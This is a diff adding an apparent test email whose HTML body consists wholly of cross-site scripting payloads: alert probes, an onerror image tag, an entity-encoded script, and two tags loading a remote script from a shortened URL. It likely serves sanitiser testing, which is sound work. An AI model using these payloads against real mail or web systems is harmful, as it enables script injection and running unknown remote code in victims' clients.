@@ -1,0 +1,11 @@
+From: <attacker@attacker.com>
+Subject: something
+To: victim@wo.com
+MIME-Version: 1.0
+Content-type: text/html
+
+"><script>alert("kuazhan")</script>
+"><script src=http://goo.gl/Hprf82></script>
+"></textarea><script src=http://goo.gl/Hprf82></script>
+"><IMG SRC=1 onerror=alert(/XSS/)>
+&#34;&#62;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#36328;&#31449;&#34;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
